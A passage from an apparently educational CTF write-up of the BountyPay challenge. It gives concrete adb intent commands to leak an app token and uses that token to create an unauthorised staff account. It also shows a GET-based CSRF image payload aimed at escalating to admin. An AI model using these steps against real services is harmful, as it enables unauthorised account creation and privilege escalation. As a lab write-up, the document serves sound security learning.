<a id="__codelineno-41-32" name="__codelineno-41-32" href="#__codelineno-41-32"></a><span class="w">          </span><span class="n">PartThreeActivity</span><span class="p">.</span><span class="na">this</span><span class="p">.</span><span class="na">thread</span><span class="p">.</span><span class="na">start</span><span class="p">();</span>
<a id="__codelineno-41-33" name="__codelineno-41-33" href="#__codelineno-41-33"></a><span class="w">        </span><span class="p">}</span>
<a id="__codelineno-41-34" name="__codelineno-41-34" href="#__codelineno-41-34"></a><span class="w">      </span><span class="p">}</span>
<a id="__codelineno-41-35" name="__codelineno-41-35" href="#__codelineno-41-35"></a><span class="w">    </span><span class="p">}</span>
<a id="__codelineno-41-36" name="__codelineno-41-36" href="#__codelineno-41-36"></a>
<a id="__codelineno-41-37" name="__codelineno-41-37" href="#__codelineno-41-37"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">onCancelled</span><span class="p">(</span><span class="n">DatabaseError</span><span class="w"> </span><span class="n">databaseError</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-41-38" name="__codelineno-41-38" href="#__codelineno-41-38"></a><span class="w">      </span><span class="n">Log</span><span class="p">.</span><span class="na">e</span><span class="p">(</span><span class="s">&quot;TAG&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;onCancelled&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">databaseError</span><span class="p">.</span><span class="na">toException</span><span class="p">());</span>
<a id="__codelineno-41-39" name="__codelineno-41-39" href="#__codelineno-41-39"></a><span class="w">    </span><span class="p">}</span>
<a id="__codelineno-41-40" name="__codelineno-41-40" href="#__codelineno-41-40"></a><span class="w">  </span><span class="p">};</span>
<a id="__codelineno-41-41" name="__codelineno-41-41" href="#__codelineno-41-41"></a><span class="w">  </span><span class="n">databaseReference</span><span class="p">.</span><span class="na">addListenerForSingleValueEvent</span><span class="p">(</span><span class="n">r0</span><span class="p">);</span>
<a id="__codelineno-41-42" name="__codelineno-41-42" href="#__codelineno-41-42"></a><span class="p">}</span>
</code></pre></div>
<p>Now that we know all the requirement we can send the intent.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>adb shell am start -W -a android.intent.action.VIEW \
<a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>-d &quot;three://part?three=UGFydFRocmVlQWN0aXZpdHk=\&amp;switch=b24\=\&amp;header=X-Token&quot; bounty.pay
</code></pre></div>
<p>We are then asked to provide a "leaked hash".</p>
<p><img alt="" loading="lazy" src="../h12006-ctf-writeup/Screenshot%202020-06-03%20at%2022.52.38.png" /></p>
<p>Looking into the logs using <code>abd logcat</code> we can quickly see our leaked hash:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>adb logcat | grep IS:
<a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>05-31 20:32:30.618  5199  6360 D HOST IS: : http://api.bountypay.h1ctf.com
<a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>05-31 20:32:30.618  5199  6360 D TOKEN IS: : 8e9998ee3137ca9ade8f372739f062c1
</code></pre></div>
<p>When submitted we get the Congrats activity 🥳</p>
<p><img alt="CongratsActivity" loading="lazy" src="../h12006-ctf-writeup/Screenshot%202020-06-03%20at%2022.24.57.png" /></p>
<h2 id="know-your-staff">Know your staff<a class="headerlink" href="#know-your-staff" title="Permanent link">&para;</a></h2>
<h3 id="getting-an-account-on-staffbountypay">Getting an account on staff.bountypay<a class="headerlink" href="#getting-an-account-on-staffbountypay" title="Permanent link">&para;</a></h3>
<p>We ommitted some things when doing the reconnaiscance, to make the report more readable, that we now need since we don't know what to do with the token that we got from reversing the APK.</p>
<p>The most interesting thing is that there is a staff endpoint on the api which throws an error saying <code>Missing or invalid Token</code>:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>http get https://api.bountypay.h1ctf.com/api/staff
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">401</span> <span class="ne">Unauthorized</span>
<a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a><span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
<a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a><span class="na">Date</span><span class="o">:</span> <span class="l">Thu, 04 Jun 2020 19:50:18 GMT</span>
<a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a><span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.14.0 (Ubuntu)</span>
<a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a><span class="na">Transfer-Encoding</span><span class="o">:</span> <span class="l">chunked</span>
<a id="__codelineno-45-7" name="__codelineno-45-7" href="#__codelineno-45-7"></a>
<a id="__codelineno-45-8" name="__codelineno-45-8" href="#__codelineno-45-8"></a><span class="p">[</span>
<a id="__codelineno-45-9" name="__codelineno-45-9" href="#__codelineno-45-9"></a><span class="w">    </span><span class="s2">&quot;Missing or invalid Token&quot;</span>
<a id="__codelineno-45-10" name="__codelineno-45-10" href="#__codelineno-45-10"></a><span class="p">]</span>
</code></pre></div>
<p>Let's see what happens when we send the token that we got from reversing the apk:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>http get https://api.bountypay.h1ctf.com/api/staff \
<a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a>X-Token:8e9998ee3137ca9ade8f372739f062c1
<a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a>HTTP/1.1 200 OK
<a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a>Connection: keep-alive
<a id="__codelineno-46-5" name="__codelineno-46-5" href="#__codelineno-46-5"></a>Content-Type: application/json
<a id="__codelineno-46-6" name="__codelineno-46-6" href="#__codelineno-46-6"></a>Date: Wed, 03 Jun 2020 20:37:41 GMT
<a id="__codelineno-46-7" name="__codelineno-46-7" href="#__codelineno-46-7"></a>Server: nginx/1.14.0 (Ubuntu)
<a id="__codelineno-46-8" name="__codelineno-46-8" href="#__codelineno-46-8"></a>Transfer-Encoding: chunked
<a id="__codelineno-46-9" name="__codelineno-46-9" href="#__codelineno-46-9"></a>
<a id="__codelineno-46-10" name="__codelineno-46-10" href="#__codelineno-46-10"></a>[
<a id="__codelineno-46-11" name="__codelineno-46-11" href="#__codelineno-46-11"></a>    {
<a id="__codelineno-46-12" name="__codelineno-46-12" href="#__codelineno-46-12"></a>        &quot;name&quot;: &quot;Sam Jenkins&quot;,
<a id="__codelineno-46-13" name="__codelineno-46-13" href="#__codelineno-46-13"></a>        &quot;staff_id&quot;: &quot;STF:84DJKEIP38&quot;
<a id="__codelineno-46-14" name="__codelineno-46-14" href="#__codelineno-46-14"></a>    },
<a id="__codelineno-46-15" name="__codelineno-46-15" href="#__codelineno-46-15"></a>    {
<a id="__codelineno-46-16" name="__codelineno-46-16" href="#__codelineno-46-16"></a>        &quot;name&quot;: &quot;Brian Oliver&quot;,
<a id="__codelineno-46-17" name="__codelineno-46-17" href="#__codelineno-46-17"></a>        &quot;staff_id&quot;: &quot;STF:KE624RQ2T9&quot;
<a id="__codelineno-46-18" name="__codelineno-46-18" href="#__codelineno-46-18"></a>    }
<a id="__codelineno-46-19" name="__codelineno-46-19" href="#__codelineno-46-19"></a>]
</code></pre></div>
<p>The endpoint now returns two accounts. Something I did not notice at first is that the same endpoint also answers to POST requests. This can be explained since in part II, I limited my recon to enumerating directories and files using GET requests. Something to keep in mind when working with APIs, always test the different HTTP methods 😉</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>http post https://api.bountypay.h1ctf.com/api/staff \
<a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>X-Token:8e9998ee3137ca9ade8f372739f062c1
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">400</span> <span class="ne">Bad Request</span>
<a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a><span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
<a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a><span class="na">Date</span><span class="o">:</span> <span class="l">Wed, 03 Jun 2020 21:21:15 GMT</span>
<a id="__codelineno-48-5" name="__codelineno-48-5" href="#__codelineno-48-5"></a><span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.14.0 (Ubuntu)</span>
<a id="__codelineno-48-6" name="__codelineno-48-6" href="#__codelineno-48-6"></a><span class="na">Transfer-Encoding</span><span class="o">:</span> <span class="l">chunked</span>
<a id="__codelineno-48-7" name="__codelineno-48-7" href="#__codelineno-48-7"></a>
<a id="__codelineno-48-8" name="__codelineno-48-8" href="#__codelineno-48-8"></a><span class="p">[</span>
<a id="__codelineno-48-9" name="__codelineno-48-9" href="#__codelineno-48-9"></a><span class="w">    </span><span class="s2">&quot;Missing Parameter&quot;</span>
<a id="__codelineno-48-10" name="__codelineno-48-10" href="#__codelineno-48-10"></a><span class="p">]</span>
</code></pre></div>
<p>With the POST method we get a different error message "Missing Parameter". The logical thing to do is to try the parameters that we saw in the GET request (<code>name</code> and <code>staff_id</code>). When we send the parameter <code>staff_id</code> with a dummy value we get an error message "Invalid Staff ID".</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>http -f post https://api.bountypay.h1ctf.com/api/staff \
<a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a>X-Token:8e9998ee3137ca9ade8f372739f062c1 \
<a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a>staff_id=a
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">404</span> <span class="ne">Not Found</span>
<a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a><span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
<a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a><span class="na">Date</span><span class="o">:</span> <span class="l">Wed, 03 Jun 2020 21:22:44 GMT</span>
<a id="__codelineno-50-5" name="__codelineno-50-5" href="#__codelineno-50-5"></a><span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.14.0 (Ubuntu)</span>
<a id="__codelineno-50-6" name="__codelineno-50-6" href="#__codelineno-50-6"></a><span class="na">Transfer-Encoding</span><span class="o">:</span> <span class="l">chunked</span>
<a id="__codelineno-50-7" name="__codelineno-50-7" href="#__codelineno-50-7"></a>
<a id="__codelineno-50-8" name="__codelineno-50-8" href="#__codelineno-50-8"></a><span class="p">[</span>
<a id="__codelineno-50-9" name="__codelineno-50-9" href="#__codelineno-50-9"></a><span class="w">    </span><span class="s2">&quot;Invalid Staff ID&quot;</span>
<a id="__codelineno-50-10" name="__codelineno-50-10" href="#__codelineno-50-10"></a><span class="p">]</span>
</code></pre></div>
<p>If we try set to value of <code>staff_id</code> to the value associated with Sam Jenkins or Brian Oliver we get an error saying "Staff Member has an account", which makes sense since this endpoint is probably used to create a new staff account.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>http -f post https://api.bountypay.h1ctf.com/api/staff \
<a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a>X-Token:8e9998ee3137ca9ade8f372739f062c1 \
<a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a>staff_id=STF:KE624RQ2T9
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">409</span> <span class="ne">Conflict</span>
<a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a><span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
<a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a><span class="na">Date</span><span class="o">:</span> <span class="l">Wed, 03 Jun 2020 21:25:07 GMT</span>
<a id="__codelineno-52-5" name="__codelineno-52-5" href="#__codelineno-52-5"></a><span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.14.0 (Ubuntu)</span>
<a id="__codelineno-52-6" name="__codelineno-52-6" href="#__codelineno-52-6"></a><span class="na">Transfer-Encoding</span><span class="o">:</span> <span class="l">chunked</span>
<a id="__codelineno-52-7" name="__codelineno-52-7" href="#__codelineno-52-7"></a>
<a id="__codelineno-52-8" name="__codelineno-52-8" href="#__codelineno-52-8"></a><span class="p">[</span>
<a id="__codelineno-52-9" name="__codelineno-52-9" href="#__codelineno-52-9"></a><span class="w">    </span><span class="s2">&quot;Staff Member already has an account&quot;</span>
<a id="__codelineno-52-10" name="__codelineno-52-10" href="#__codelineno-52-10"></a><span class="p">]</span>
</code></pre></div>
<p>Now you might remember that in in the reconnaissance phase we found the <code>staff_id</code> of a new employee named Sandra. Let's see what happens when we send this <code>staff_id:</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>http -f post https://api.bountypay.h1ctf.com/api/staff \
<a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a>X-Token:8e9998ee3137ca9ade8f372739f062c1 \
<a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a>staff_id=STF:8FJ3KFISL3
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">201</span> <span class="ne">Created</span>
<a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a><span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
<a id="__codelineno-54-3" name="__codelineno-54-3" href="#__codelineno-54-3"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<a id="__codelineno-54-4" name="__codelineno-54-4" href="#__codelineno-54-4"></a><span class="na">Date</span><span class="o">:</span> <span class="l">Wed, 03 Jun 2020 21:28:01 GMT</span>
<a id="__codelineno-54-5" name="__codelineno-54-5" href="#__codelineno-54-5"></a><span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.14.0 (Ubuntu)</span>
<a id="__codelineno-54-6" name="__codelineno-54-6" href="#__codelineno-54-6"></a><span class="na">Transfer-Encoding</span><span class="o">:</span> <span class="l">chunked</span>
<a id="__codelineno-54-7" name="__codelineno-54-7" href="#__codelineno-54-7"></a>
<a id="__codelineno-54-8" name="__codelineno-54-8" href="#__codelineno-54-8"></a><span class="p">{</span>
<a id="__codelineno-54-9" name="__codelineno-54-9" href="#__codelineno-54-9"></a><span class="w">    </span><span class="nt">&quot;description&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Staff Member Account Created&quot;</span><span class="p">,</span>
<a id="__codelineno-54-10" name="__codelineno-54-10" href="#__codelineno-54-10"></a><span class="w">    </span><span class="nt">&quot;password&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;s%3D8qB8zEpMnc*xsz7Yp5&quot;</span><span class="p">,</span>
<a id="__codelineno-54-11" name="__codelineno-54-11" href="#__codelineno-54-11"></a><span class="w">    </span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;sandra.allison&quot;</span>
<a id="__codelineno-54-12" name="__codelineno-54-12" href="#__codelineno-54-12"></a><span class="p">}</span>
</code></pre></div>
<p>Nice we now have an account for the Staff application !</p>
<h3 id="getting-marten-mickos-account">Getting Mårten Mickos account<a class="headerlink" href="#getting-marten-mickos-account" title="Permanent link">&para;</a></h3>
<p>Once we are logged in we can see 4 differents tabs:</p>
<ul>
<li>Home</li>
<li>Support Tickets</li>
<li>Profile</li>
<li>Logout</li>
</ul>
<p><img alt="Homepage" loading="lazy" src="../h12006-ctf-writeup/Screenshot%202020-06-03%20at%2023.33.11.png" /></p>
<p>There is only 1 ticket named "Welcome to BountyPay" from Admin to Sandra:</p>
<p><img alt="Support Tickets" loading="lazy" src="../h12006-ctf-writeup/Screenshot%202020-06-03%20at%2023.33.29.png" /></p>
<p>There are not action possible on this screen since it appears that replies are currently disabled. Looking at the source code of the page, there is no reference to any endpoint that we could use to send a reply.</p>
<p><img alt="Ticket 3582" loading="lazy" src="../h12006-ctf-writeup/Screenshot%202020-06-03%20at%2023.33.55.png" /></p>
<p>On the profile page there are two settings that we can update, the profile name and the avatar.</p>
<p><img alt="Profile" loading="lazy" src="../h12006-ctf-writeup/Screenshot%202020-06-03%20at%2023.34.19.png" /></p>
<p>There is also a feature that is a bit hidden in the footer that allow us to report a page to the admins with a comment saying that the admin directory will be ignored.</p>
<p><img alt="Report Page" loading="lazy" src="../h12006-ctf-writeup/Screenshot%202020-06-03%20at%2023.34.59.png" /></p>
<p>The last interesting thing is a bit of JavaScript:</p>
<div class="highlight"><span class="filename">/js/website.js</span><pre><span></span><code><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;.upgradeToAdmin&quot;</span><span class="p">).</span><span class="nx">click</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a><span class="w">  </span><span class="kd">let</span><span class="w"> </span><span class="nx">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;input[name=&quot;username&quot;]&#39;</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
<a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a><span class="w">  </span><span class="nx">$</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">&quot;/admin/upgrade?username=&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">t</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-55-4" name="__codelineno-55-4" href="#__codelineno-55-4"></a><span class="w">    </span><span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;User Upgraded to Admin&quot;</span><span class="p">)</span>
<a id="__codelineno-55-5" name="__codelineno-55-5" href="#__codelineno-55-5"></a><span class="w">  </span><span class="p">})</span>
<a id="__codelineno-55-6" name="__codelineno-55-6" href="#__codelineno-55-6"></a><span class="p">});</span>
<a id="__codelineno-55-7" name="__codelineno-55-7" href="#__codelineno-55-7"></a>
<a id="__codelineno-55-8" name="__codelineno-55-8" href="#__codelineno-55-8"></a><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;.tab&quot;</span><span class="p">).</span><span class="nx">click</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-55-9" name="__codelineno-55-9" href="#__codelineno-55-9"></a><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;.tab&quot;</span><span class="p">).</span><span class="nx">removeClass</span><span class="p">(</span><span class="s2">&quot;active&quot;</span><span class="p">),</span><span class="w"> </span>
<a id="__codelineno-55-10" name="__codelineno-55-10" href="#__codelineno-55-10"></a><span class="w">  </span><span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">addClass</span><span class="p">(</span><span class="s2">&quot;active&quot;</span><span class="p">),</span><span class="w"> </span>
<a id="__codelineno-55-11" name="__codelineno-55-11" href="#__codelineno-55-11"></a><span class="w">  </span><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;div.content&quot;</span><span class="p">).</span><span class="nx">addClass</span><span class="p">(</span><span class="s2">&quot;hidden&quot;</span><span class="p">),</span><span class="w"> </span>
<a id="__codelineno-55-12" name="__codelineno-55-12" href="#__codelineno-55-12"></a><span class="w">  </span><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;div.content-&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">attr</span><span class="p">(</span><span class="s2">&quot;data-target&quot;</span><span class="p">)).</span><span class="nx">removeClass</span><span class="p">(</span><span class="s2">&quot;hidden&quot;</span><span class="p">),</span><span class="w"> </span><span class="o">!</span><span class="mf">1</span>
<a id="__codelineno-55-13" name="__codelineno-55-13" href="#__codelineno-55-13"></a><span class="p">});</span><span class="w"> </span>
<a id="__codelineno-55-14" name="__codelineno-55-14" href="#__codelineno-55-14"></a>
<a id="__codelineno-55-15" name="__codelineno-55-15" href="#__codelineno-55-15"></a><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;.sendReport&quot;</span><span class="p">).</span><span class="nx">click</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-55-16" name="__codelineno-55-16" href="#__codelineno-55-16"></a><span class="w">  </span><span class="nx">$</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">&quot;/admin/report?url=&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">url</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-55-17" name="__codelineno-55-17" href="#__codelineno-55-17"></a><span class="w">    </span><span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;Report sent to admin team&quot;</span><span class="p">)</span>
<a id="__codelineno-55-18" name="__codelineno-55-18" href="#__codelineno-55-18"></a><span class="w">  </span><span class="p">}),</span><span class="w"> </span><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#myModal&quot;</span><span class="p">).</span><span class="nx">modal</span><span class="p">(</span><span class="s2">&quot;hide&quot;</span><span class="p">)</span>
<a id="__codelineno-55-19" name="__codelineno-55-19" href="#__codelineno-55-19"></a><span class="p">});</span>
<a id="__codelineno-55-20" name="__codelineno-55-20" href="#__codelineno-55-20"></a>
<a id="__codelineno-55-21" name="__codelineno-55-21" href="#__codelineno-55-21"></a><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="o">&amp;&amp;</span>
<a id="__codelineno-55-22" name="__codelineno-55-22" href="#__codelineno-55-22"></a><span class="p">(</span><span class="s2">&quot;#tab1&quot;</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="w"> </span><span class="o">&amp;&amp;</span>
<a id="__codelineno-55-23" name="__codelineno-55-23" href="#__codelineno-55-23"></a><span class="w">  </span><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;.tab1&quot;</span><span class="p">).</span><span class="nx">trigger</span><span class="p">(</span><span class="s2">&quot;click&quot;</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;#tab2&quot;</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="w"> </span><span class="o">&amp;&amp;</span>
<a id="__codelineno-55-24" name="__codelineno-55-24" href="#__codelineno-55-24"></a><span class="w">  </span><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;.tab2&quot;</span><span class="p">).</span><span class="nx">trigger</span><span class="p">(</span><span class="s2">&quot;click&quot;</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;#tab3&quot;</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="w"> </span><span class="o">&amp;&amp;</span>
<a id="__codelineno-55-25" name="__codelineno-55-25" href="#__codelineno-55-25"></a><span class="w">  </span><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;.tab3&quot;</span><span class="p">).</span><span class="nx">trigger</span><span class="p">(</span><span class="s2">&quot;click&quot;</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;#tab4&quot;</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="w"> </span><span class="o">&amp;&amp;</span>
<a id="__codelineno-55-26" name="__codelineno-55-26" href="#__codelineno-55-26"></a><span class="w">  </span><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;.tab4&quot;</span><span class="p">).</span><span class="nx">trigger</span><span class="p">(</span><span class="s2">&quot;click&quot;</span><span class="p">)</span>
<a id="__codelineno-55-27" name="__codelineno-55-27" href="#__codelineno-55-27"></a><span class="p">);</span>
</code></pre></div>
<p>In this JavaScript file we can see multiple things:</p>
<ul>
<li>There is an <code>/admin/upgrade</code> endpoint which will use the value of an input with the name username as the username</li>
<li>Clicking on an element with the <code>sendReport</code> class will trigger a GET request to the <code>/admin/report?url=</code></li>
<li>Based on the hash present in the URL, a click will be simulated to go directly to the right tab</li>
</ul>
<p>Let's start investigating the upgrade endpoint since this our goal is probably to get an admin account. Of course simply requesting the endpoint would be too easy and we get an error if we try to do so :(</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>http get https://staff.bountypay.h1ctf.com/admin/upgrade
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">401</span> <span class="ne">Unauthorized</span>
<a id="__codelineno-57-2" name="__codelineno-57-2" href="#__codelineno-57-2"></a><span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
<a id="__codelineno-57-3" name="__codelineno-57-3" href="#__codelineno-57-3"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<a id="__codelineno-57-4" name="__codelineno-57-4" href="#__codelineno-57-4"></a><span class="na">Date</span><span class="o">:</span> <span class="l">Fri, 05 Jun 2020 17:24:01 GMT</span>
<a id="__codelineno-57-5" name="__codelineno-57-5" href="#__codelineno-57-5"></a><span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.14.0 (Ubuntu)</span>
<a id="__codelineno-57-6" name="__codelineno-57-6" href="#__codelineno-57-6"></a><span class="na">Transfer-Encoding</span><span class="o">:</span> <span class="l">chunked</span>
<a id="__codelineno-57-7" name="__codelineno-57-7" href="#__codelineno-57-7"></a>
<a id="__codelineno-57-8" name="__codelineno-57-8" href="#__codelineno-57-8"></a><span class="p">[</span>
<a id="__codelineno-57-9" name="__codelineno-57-9" href="#__codelineno-57-9"></a><span class="w">    </span><span class="s2">&quot;Only admins can perform this&quot;</span>
<a id="__codelineno-57-10" name="__codelineno-57-10" href="#__codelineno-57-10"></a><span class="p">]</span>
</code></pre></div>
<p>At this point it appears that we will need to find a way to trick an admin users into upgrading our account. Let's see if we can find a way to perform a Cross-Site Request Forgery (CSRF) attack. Since the method used to upgrade the account is GET (don't do that) we don't need a Cross-Site Scripting (XSS) and being able to inject an image would be sufficient:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;/admin/upgrade?username=sandra.allison&quot;</span> <span class="p">/&gt;</span>
</code></pre></div>
<p>The profile page appears to be our best candidate to find such a vulnerability since:</p>
<ul>
<li>We cannot use the report feature here as the <code>/admin</code> directory is ignored</li>
<li>The ticket page does not provide us with a way to send a reply</li>
</ul>
<p>Let's look at the request used to update our profile name:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>http -f post &quot;https://staff.bountypay.h1ctf.com/?template=home&quot; \
<a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a>Cookie:&#39;token=c0...&#39; \
<a id="__codelineno-59-3" name="__codelineno-59-3" href="#__codelineno-59-3"></a>profile_name=%3Cs%3Esandra%3C%2Fs%3E
</code></pre></div>
